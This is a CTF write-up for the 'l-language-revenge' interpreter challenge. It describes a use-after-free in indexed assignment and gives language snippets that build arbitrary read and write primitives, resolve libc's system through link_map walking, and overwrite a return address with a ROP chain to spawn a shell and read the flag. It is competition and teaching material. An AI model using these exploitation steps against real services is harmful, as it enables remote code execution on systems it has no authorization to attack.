# l-language-revenge writeup

## Scope and environment

Target: the local CTF service exposed on `127.0.0.1:5000`. The exploit path does not use `docker exec`, does not read the flag from the host/container filesystem, and does not modify the binary or container.

The exact reproduction commands for the intended Docker deployment are:

```bash
unzip pwn_l-language-revenge.zip -d l-language-revenge
cd l-language-revenge

docker build -t l-language-revenge .
docker rm -f l-language-revenge 2>/dev/null || true
docker run --rm -it \
  --name l-language-revenge \
  -p 127.0.0.1:5000:5000 \
  l-language-revenge
```

In a second terminal:

```bash
nc 127.0.0.1 5000
python3 solve.py --host 127.0.0.1 --port 5000
```

The Docker daemon was not available in this analysis sandbox, so the final TCP proof in this environment was done with a local TCP wrapper around the challenge binary. The exploit itself is service-oriented and the default command is `cat /home/ctf/flag.txt; exit`.

## Deployment files

`Dockerfile` builds from `ubuntu:24.04`, installs `xinetd`, creates user `ctf`, copies `chall_release` to `/home/ctf/chall`, copies `flag.txt` to `/home/ctf/flag.txt`, and starts `/entrypoint.sh`.

`entrypoint.sh` sets the flag mode to `444` and starts xinetd in foreground mode:

```sh
chmod 444 /home/ctf/flag.txt
exec xinetd -dontfork -f /etc/xinetd.d/chall
```

`chall.xinetd` exposes an unlisted TCP service on port `5000`, runs as user `ctf`, and executes `/home/ctf/chall`.

## Protocol

The service prints:

```text
Send your program (end with __EOF__):
```

It reads source code for the custom language until a line containing:

```text
__EOF__
```

A minimal input is:

```c
print("hello");
__EOF__
```

Calling:

```c
print("/bin/sh");
__EOF__
```

only prints the static hint:

```text
Vulnerable function you can get shell by calling print("/bin/sh")
```

`print` is not the command-execution primitive. It has no `system`, `execve`, or `popen`-style import path.

## Grammar overview

The language grammar in `L.g4` supports:

- primitive types: `int`, `string`
- arrays: `int a[expr];` and `string s[expr];`
- declarations with optional initializers
- assignments to variables and indexed elements
- functions, including `void` functions
- function calls and function-call statements
- `if` / `else`
- `while`
- `return`
- arithmetic, shifts, bitwise operators, comparisons, and logical operators
- string literals without escapes
- integer literals in decimal or `0x` hex form

Important grammar productions:

```antlr
assignstat
    : IDENTIFIER '=' expr ';'
    | IDENTIFIER '[' expr ']' '=' expr ';'
    ;

factor
    : literal
    | MINUS expr
    | IDENTIFIER
    | IDENTIFIER '[' expr ']'
    | LPAR expr RPAR
    | funccall
    ;
```

## Binary reconnaissance

`chall_release` is:

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID b74a42f9afdb303e860f7484331335f5eb979d01,
for GNU/Linux 3.2.0, not stripped
```

Protections observed with `readelf`:

- PIE: yes, ELF type `DYN` and dynamic flag `PIE`
- NX: yes, `GNU_STACK` is `RW`, not executable
- RELRO: full RELRO, with `GNU_RELRO` and `BIND_NOW`
- stack canary: yes, imports `__stack_chk_fail`

Important symbols:

```text
main                                           0x26a50
print(std::vector<Value> const&)              0x35c10
getInt(std::vector<Value> const&)             0x3cf20
getStr(std::vector<Value> const&)             0x3d2a0
KVisitor::visitProgram                        0x35680
KVisitor::visitChunk                          0x35570
KVisitor::visitStat                           0x35710
KVisitor::visitExpr                           0x37640
KVisitor::visitVardecl                        0x38ad0
KVisitor::visitAssignstat                     0x39d50
KVisitor::visitFunccall                       0x3caa0
KVisitor::visitFuncallstat                    0x3c6a0
KVisitor::executeFunction                     0x3bc50
KVisitor::validateArray                       0x36080
KVisitor::validateString                      0x35e30
Environment::defineFunction                   0x289d0
Environment::functionExists                   0x40250
Value::destroy                                0x27e10
```

The dynamic symbol table does not import `system`, `execve`, `popen`, `fork`, `open`, `read`, or `write`. The final exploit dynamically finds libc's already-loaded `system` symbol through the runtime linker data structures.

## Runtime behavior and bug

The interpreter's `Value` object is 0x28 bytes. The useful layout is:

```text
+0x00  type enum        0=int, 1=string, 2=array, 3=void/default
+0x08  int value, string pointer, or vector begin
+0x10  string length, or vector end
+0x18  string SSO buffer / vector capacity / extra object data
```

String indexing returns a signed byte, so bytes above `0x7f` must be normalized with:

```c
int ub(int x){ int y=c[x]; if(y<0){ return y+256; } return y; }
```

The vulnerability is in indexed assignment. For a statement like:

```c
s[index_expr] = rhs_expr;
```

`KVisitor::visitAssignstat` validates the original target and first index, then evaluates the right-hand expression, and only after that writes through the previously saved target object pointer. The right-hand expression can reassign the target variable, destroying/replacing the original object, while the final write still uses the stale object pointer.

The security-relevant instruction is the final string indexed write:

```asm
39fed: 49 8b 47 08        mov    0x8(%r15),%rax
39ff1: 48 8b 54 24 68     mov    0x68(%rsp),%rdx
39ff6: 88 14 28           mov    %dl,(%rax,%rbp,1)
```

Here, `r15` is the stale `Value *`, `rax` is loaded from `stale_value + 8`, and `rbp` is the second index value. Because the index is evaluated again after the RHS has run, the exploit uses a function whose first call returns `0` for validation and whose second call returns an attacker-controlled offset.

## Exploit primitive

First, the exploit converts the stale string write into a string-length corruption:

```c
int ix(){ if(n==0){ n=1; return 0; } return o; }
int rm(){ s=t; c=t; return v; }

/* validate s[0], RHS frees/replaces s and causes the stale slot to be reused, then write at offset -8 */
o=-8; v=200; n=0; s[ix()]=rm();
```

That changes `c.length` to `200`, giving forward out-of-bounds reads through `c[i]`.

Next, the exploit turns the stale string write into an arbitrary one-byte write. Reclaiming the stale string object as an integer means the final string write treats the integer value as the string data pointer:

```c
int am(){ s=t; h=b; return v; }
int wb(int a,int x){ b=a; v=x; o=0; n=0; s[ix()]=am(); return 0; }
```

This yields:

```c
wb(address, byte)
wq(address, qword)
```

The exploit then forges `c.ptr` and `c.length` with `pt(address)`, making `c[i]` an arbitrary read primitive.

## libc resolution and stack control

The exploit does not hardcode a libc version. It reads the main binary's `DT_DEBUG` entry at PIE base + `0xfbaf8`, walks `r_debug.r_map`, finds the libc `link_map`, reads libc's dynamic table, then resolves symbols through `DT_GNU_HASH`, `DT_STRTAB`, and `DT_SYMTAB`.

GNU hash constants used:

```text
DT_GNU_HASH        0x6ffffef5 / 1879047925
hash("system")     0x1ceee48a / 485418122
hash("environ")    0x6ba3dda6 / 1805901222
```

The exploit resolves:

```text
system
__environ/environ
```

It then reads `environ`, scans downward on the stack for the active return address back into `KVisitor::visitFuncallstat`, and overwrites that return address with a short ROP chain:

```text
ret
pop rdi ; ret
pointer to writable "/bin/sh\0" string
system
```

The exploit writes `/bin/sh\0` into a writable string SSO buffer and passes that pointer to `system`. After the shell is obtained, `solve.py` sends:

```sh
cat /home/ctf/flag.txt; exit
```

## Main binary offsets used

These offsets are relative to the PIE base:

```text
DT_DEBUG dynamic entry value    0xfbaf8
return site to overwrite        0x3c884
ret gadget                      0x1401a
pop rdi ; ret                   0x2218e
```

The exploit has a small fallback for the two observed heap/OOB layouts:

```c
d=rr(144)-160; p=rr(88)-1011136;
if(p-(p/4096)*4096!=0){ d=rr(120)-24; p=rr(184)-1011136; }
```

## Verification performed in this sandbox

Docker was unavailable here (`docker: command not found`), so I could not obtain the real `/home/ctf/flag.txt` from the xinetd container in this environment.

I did verify the exploit path over a TCP connection by running a local socket wrapper that connected a TCP client to the challenge process. The command below exploited the service process, spawned `/bin/sh`, sent a command through the same TCP stream, and printed the command output:

```bash
python3 solve.py --host 127.0.0.1 --port 5001 --cmd 'echo WRAPPED; exit'
```

Output:

```text
WRAPPED
```

A second TCP-wrapper test confirmed brace-style flag extraction:

```bash
python3 solve.py --host 127.0.0.1 --port 5001 --cmd 'echo flag{test_flag}; exit'
```

Output:

```text
flag{test_flag}
```

The intended final test in Docker is:

```bash
python3 solve.py --host 127.0.0.1 --port 5000
```

The default command in `solve.py` is already:

```sh
cat /home/ctf/flag.txt; exit
```

## Final exploit

The final exploit is in `solve.py`. It supports:

```bash
python3 solve.py --host 127.0.0.1 --port 5000
python3 solve.py --local --binary ./chall_release
```

The TCP mode uses pwntools if available and falls back to a small socket wrapper otherwise. The local mode expects pwntools.
